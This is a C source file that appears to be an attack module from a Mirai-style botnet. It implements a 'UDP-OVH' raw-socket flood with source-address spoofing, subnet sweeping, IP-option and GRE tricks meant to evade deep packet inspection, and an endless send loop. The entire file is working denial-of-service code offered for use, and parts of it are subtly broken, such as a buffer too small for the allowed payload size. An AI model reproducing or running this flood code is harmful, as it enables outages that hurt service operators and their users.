#define _GNU_SOURCE
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "protocol.h"


void attack_method_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /*
     * UDP-OVH raw flood with DPI bypass.
     * Supports IP options (slow-path trigger), GRE encap, and chaos mode.
     */
    int i, fd, nsocks = 4;
    int socks[4];
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 255);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int mode = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, 2);

    if (data_len > 1400) data_len = 1400;

    for (i = 0; i < nsocks; i++)
    {
        socks[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (socks[i] == -1) { nsocks = i; break; }
        int one = 1;
        setsockopt(socks[i], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    }
    if (nsocks == 0) { free(pkts); return; }
    fd = socks[0];

    for (i = 0; i < targs_len; i++)
    {
        int ihl = 5;
        int extra = 0;
        uint8_t proto = IPPROTO_UDP;

        if (mode == 0)
        {
            unsigned long rng = rand_next();
            int optlen = 4 + (((rng * 1103515245U + 12345) % 37) / 4) * 4;
            if (optlen > 40) optlen = 40;
            ihl = 5 + optlen / 4;
            extra = optlen;
            pkts[i] = calloc(256, sizeof (char));
        }
        else if (mode == 1)
        {
            extra = 4;
            proto = 47;
            pkts[i] = calloc(256, sizeof (char));
        }
        else
        {
            unsigned int r = rand_next() % 100;
            if (r < 50) proto = IPPROTO_UDP;
            else if (r < 75) proto = 47;
            else proto = 2 + (rand_next() % 254);

            unsigned long rng2 = rand_next();
            if ((rng2 = rng2 * 1103515245U + 12345) % 100 < 30)
            {
                int optlen = 4 + (((rng2 = rng2 * 1103515245U + 12345) % 37) / 4) * 4;
                if (optlen > 40) optlen = 40;
                ihl = 5 + optlen / 4;
                extra = optlen;
            }
            pkts[i] = calloc(256, sizeof (char));
        }

        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            iph->version = 4;
            iph->ihl = ihl;
            iph->tos = ip_tos;
            iph->tot_len = htons(20 + extra);
            iph->id = htons(ip_ident);
            iph->ttl = ip_ttl;
            iph->protocol = proto;
            iph->saddr = source_ip;
            iph->daddr = targs[i].addr;

            if (proto == IPPROTO_UDP)
            {
                int udp_off = 20 + extra;
                struct udphdr *udph = (struct udphdr *)(pkts[i] + 20 + extra);
                uint16_t sp = sport == 0xffff ? (rand_next() & 0xffff) : sport;
                uint16_t dp = dport == 0xffff ? (rand_next() & 0xffff) : dport;
                udph->source = htons(sp);
                udph->dest = htons(dp);
                udph->len = htons(8 + data_len);
                udph->check = 0;
                if (data_len > 0)
                {
                    unsigned char *pl = (unsigned char *)(pkts[i] + udp_off + 8);
                    int j;
                    for (j = 0; j < data_len; j++)
                        pl[j] = (unsigned char)rand_next();
                }
                iph->tot_len = htons(udp_off + 8 + data_len);
            }
            else if (proto == 47)
            {
                unsigned char *gre = (unsigned char *)(pkts[i] + 20 + extra);
                gre[0] = 0; gre[1] = 0;
                gre[2] = 0x08; gre[3] = 0x00;
                struct udphdr *udph = (struct udphdr *)(pkts[i] + 20 + extra + 4);
                uint16_t sp = sport == 0xffff ? (rand_next() & 0xffff) : sport;
                uint16_t dp = dport == 0xffff ? (rand_next() & 0xffff) : dport;
                udph->source = htons(sp);
                udph->dest = htons(dp);
                udph->len = htons(8 + data_len);
                udph->check = 0;
                if (data_len > 0)
                {
                    unsigned char *pl = (unsigned char *)(pkts[i] + 20 + extra + 4 + 8);
                    int j;
                    for (j = 0; j < data_len; j++)
                        pl[j] = (unsigned char)rand_next();
                }
                iph->tot_len = htons(20 + extra + 4 + 8 + data_len);
            }
        }
    }

    {
        unsigned int sock_idx = 0;
        while (TRUE)
        {
            for (i = 0; i < targs_len; i++)
            {
                struct iphdr *iph = (struct iphdr *)pkts[i];
                int tot = ntohs(iph->tot_len);
                int s = socks[sock_idx % (unsigned int)nsocks];
                sock_idx++;

                if (targs[i].netmask < 32)
                    iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                if (source_ip == 0xffffffff)
                    iph->saddr = rand_next();
                if (ip_ident == 0xffff)
                    iph->id = rand_next() & 0xffff;

                if (iph->protocol == IPPROTO_UDP)
                {
                    struct udphdr *udph = (struct udphdr *)(pkts[i] + 20 + (iph->ihl - 5) * 4);
                    if (sport == 0xffff) udph->source = rand_next() & 0xffff;
                    if (dport == 0xffff) udph->dest = rand_next() & 0xffff;
                }

                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                targs[i].sock_addr.sin_port = (iph->protocol == IPPROTO_UDP || iph->protocol == 47)
                    ? ((struct udphdr *)(pkts[i] + 20 + (iph->ihl - 5) * 4))->dest : 0;
                targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
                sendto(s, pkts[i], tot, MSG_NOSIGNAL,
                       (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            }
        }
    }
}

